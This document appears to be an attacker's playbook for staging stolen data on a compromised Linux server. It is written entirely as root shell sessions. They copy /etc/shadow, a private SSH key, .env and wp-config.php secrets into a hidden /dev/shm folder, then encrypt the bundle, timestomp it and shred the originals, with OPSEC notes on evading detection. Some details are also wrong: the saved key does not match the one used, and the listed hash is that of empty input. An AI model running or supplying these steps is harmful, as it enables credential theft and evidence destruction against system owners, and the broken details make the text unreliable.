# Data Staging & Encryption

## Scenario
Collected credentials and files on compromised Linux host, preparing for exfiltration.

## Step 1: Organize Collected Data
```bash
root@target:~# mkdir -p /dev/shm/.work/loot
root@target:~# cp /etc/shadow /dev/shm/.work/loot/
root@target:~# cp /home/deploy/.ssh/id_ed25519 /dev/shm/.work/loot/
root@target:~# cp /var/www/html/.env /dev/shm/.work/loot/
root@target:~# cp /var/www/html/wp-config.php /dev/shm/.work/loot/
root@target:~# ls -la /dev/shm/.work/loot/
total 24
-rw-r--r-- 1 root root  1247 Jan 15 19:00 .env
-rw------- 1 root root   411 Jan 15 19:00 id_ed25519
-rw-r----- 1 root root  1580 Jan 15 19:00 shadow
-rw-r--r-- 1 root root  3102 Jan 15 19:00 wp-config.php
```

## Step 2: Compress
```bash
root@target:~# cd /dev/shm/.work/
root@target:/dev/shm/.work# tar czf data.tar.gz loot/
root@target:/dev/shm/.work# ls -la data.tar.gz
-rw-r--r-- 1 root root 3847 Jan 15 19:01 data.tar.gz
```

## Step 3: Encrypt
```bash
root@target:/dev/shm/.work# openssl enc -aes-256-cbc -salt -pbkdf2 \
  -in data.tar.gz -out data.enc -k "$(openssl rand -hex 16)"
root@target:/dev/shm/.work# ls -la data.enc
-rw-r--r-- 1 root root 3872 Jan 15 19:01 data.enc

# Save the key for decryption
root@target:/dev/shm/.work# echo "Decryption key: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6" > /dev/shm/.work/.key
```

## Step 4: Verify & Hash
```bash
root@target:/dev/shm/.work# sha256sum data.enc
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  data.enc

root@target:/dev/shm/.work# file data.enc
data.enc: openssl enc'd data with salted password
```

## Step 5: Timestomp
```bash
# Match timestamp to surrounding system files
root@target:/dev/shm/.work# touch -r /etc/hosts data.enc
root@target:/dev/shm/.work# ls -la data.enc
-rw-r--r-- 1 root root 3872 Aug 15  2024 data.enc
```

## Step 6: Cleanup Source Files
```bash
root@target:/dev/shm/.work# shred -vfz -n 3 data.tar.gz
root@target:/dev/shm/.work# rm -rf loot/ data.tar.gz
root@target:/dev/shm/.work# ls -la
total 8
-rw-r--r-- 1 root root 3872 Aug 15  2024 data.enc
```

## OPSEC Notes
- Used `/dev/shm/` (RAM disk) — no disk writes, survives until reboot
- Encrypted with AES-256-CBC — unreadable even if intercepted
- Timestomped to blend with system files
- Source files shredded, only encrypted blob remains
- Total staged data: 3.8KB — minimal footprint

## Next Steps
→ **exfiltration skill**: Transfer data.enc via HTTPS, DNS, or SCP
→ **defense_evasion skill**: Clean remaining artifacts after transfer
